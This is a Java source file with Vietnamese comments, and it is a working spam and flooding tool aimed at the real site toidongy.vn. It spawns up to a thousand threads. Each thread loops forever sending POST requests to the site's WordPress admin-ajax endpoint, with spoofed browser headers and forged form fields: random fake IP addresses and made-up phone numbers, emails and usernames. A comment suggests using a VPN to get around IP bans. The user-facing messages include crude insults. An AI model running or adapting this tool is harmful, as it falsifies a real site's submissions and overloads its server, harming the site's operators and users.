package vn.giakhanhvn.networking;

import java.io.InputStream;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.util.Random;
import java.util.Scanner;

import sun.misc.Signal;
import sun.misc.SignalHandler;

public class DitMeToidongy {
	static int COUNTER = 0;
	static long STARTED = 0;
	static int READY = 0;
	
	public static void main(String args[]) throws Exception {
		STARTED = System.currentTimeMillis();
		DitMeToidongy.c();
		var scan = new Scanner(System.in);
		out("\n[BETA v0.1] PHAN MEM SPAM CHU KY toidongy.vn CHO LANG GOM TRI DO BALLS\n"
			+ "Author: Nguyen Gia Khanh (GiaKhanhVN)\n"
			+ "\n* Luu y: so luong Thread la so luong ma JVM\n"
			+ "se branch ra trong qua trinh spam, neu may tinh\n"
			+ "khoe thi co the dung tu 50-60 Threads, neu vua\n"
			+ "phai thi chi 10-20 threads la vua du!\n\n"
			+ "(-) Nhan CTRL + C de thoat khoi phan mem\n"
		);
		Signal.handle(new Signal("INT"), new SignalHandler() {
			public void handle(Signal signal) {
				out("\n\n[SYS] Da dung may ao Java! Session da gui tong cong " + COUNTER + " requests\nThoi gian chay cua session: " + ((System.currentTimeMillis() - STARTED) / 1000D) + "s\n");
				System.exit(0);
			}
		});
		System.out.print("=> Nhap so luong Thread: ");
		String inp = scan.next();
		scan.close();
		int soLuongThread = 0;
		try {
			soLuongThread = Integer.parseInt(inp);
		}
		catch (NumberFormatException e) {
			out("[ERROR] May vua nhap cai cc gi vao day ha thg cho? Nhap 1 SO TU NHIEN VAO");
			out("[SYS] Chuong trinh dung lai trong 5s!");
			Thread.sleep(5000);
			System.exit(0);
			return;
		}
		if (soLuongThread <= 0 || soLuongThread > 1000) {
			out("[ERROR] So luong thread khong hop le! (Lon hon 0 va nho hon 1000)");
			out("[SYS] Chuong trinh dung lai trong 5s!");
			Thread.sleep(5000);
			System.exit(0);
			return;
		}
		
		out("\n[SYS] Dang khoi tao chuong trinh!\n[SYS] Luong thread se chay: " + soLuongThread + "\n");
		
		Thread.sleep(1000);
		// Logic chuong trinh
		for (int i = 0; i < soLuongThread; i++) {
			// Khoi dong 1 JVM thread moi
			final int a = i;
			final int b = soLuongThread;
			new Thread(() -> {
				// Moi 0.1s start 1 thread cho do
				// stress CPU
				try {
					Thread.sleep(a * 100);
				} catch (InterruptedException e1) {
					e1.printStackTrace();
				}
				READY++;
				out("[THREAD-SPAWN] Da khoi chay JVM Thread #" + Thread.currentThread().getId() + " thanh cong! (" + READY + "/" + b + ")");
				try {
					// Lien tuc spam exec
					do exec(); while (true);
				} catch (Exception e) {
					/* 
					 * Catch Exception (co the do web timeout
					 * hoac an ban-ip), co the dung VPN de tiep tuc
					*/
					out("[ERROR] Thread #" + Thread.currentThread().getId() + " da xay ra loi! Stack Trace: "
					+ e.getStackTrace()[0]);
					out("[SYS] Chuong trinh khoi dong lai trong 60s!");
					try {
						Thread.sleep(60000);
						System.exit(0);
					} catch (Exception e1) {
						e1.printStackTrace();
					}
				}
			}).start();
		}
		
	}

	// Ham de generate ra 1 cai IP random (no co the trung vs ip cua m :))
	static String randIp() {
		var r = new Random();
		return r.nextInt(256) + "." + r.nextInt(256) 
		+ "." + r.nextInt(256) + "." + r.nextInt(256);
	}

	public static void exec() throws Exception {
		out("[LOG] Su dung Thread #" + Thread.currentThread().getId() + " va gui tap lenh POST Request...\n");
		var milis = System.currentTimeMillis();
		// Payload se gui den website (1 payload co ip bat ky)
		var randIp = DitMeToidongy.randIp();
		// tao 1 cai Payload
		var payload = "action=updateIpaddress&ipAddress={ip}&note_ido={num}&phone_ido={num}&email_ido={num}%40{num}&username_ido={num}"
				.replace("{ip}", randIp)
				.replace("{num}", String.valueOf(new Random().nextInt((99999 - 1000) + 1) + 1000));

		// Open connection bang Java HTTPClient
		var client = HttpClient.newHttpClient();
		// Build request Header va Payload
		var request = HttpRequest.newBuilder().uri(URI.create("https://toidongy.vn/wp-admin/admin-ajax.php"))
				.setHeader("X-Requested-With", "root")
				.setHeader("Accept", "application/json, text/javascript, /; q=0.01")
				.setHeader("Accept-Language", "en-GB,en;q=0.9,en-US;q=0.8")
				.setHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8;")
				.setHeader("Cookie", "")
				.setHeader("Origin", "https://toidongy.vn/").setHeader("Referer", "https://toidongy.vn/")
				.setHeader("User-Agent",
					"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.81 Safari/537.36 Edg/104.0.1293.54")
				.POST(HttpRequest.BodyPublishers.ofString(payload)).build();

		// Gui payload kem Header tu Client
		var res = client.send(request, HttpResponse.BodyHandlers.ofString());
		COUNTER++;
		out("[LOG] Thread #" + Thread.currentThread().getId() + " thuc hien xong! Ma Status: " + res.statusCode()
			+ "\nFake IP da dung: " + randIp + "\nThoi gian thuc hien: " + ((System.currentTimeMillis() - milis) / 1000D) + "s\nThuc hien lan thu: " + COUNTER + "\n");
		
		// Tam thoi sleep thread trong 2s cho do bi spam
		Thread.sleep(3000);
	}

	static void out(Object a) {
		System.out.println(a);
	}
	
	static void c() {
		System.out.print("\033[H\033[2J");  
		System.out.flush();
	}
}
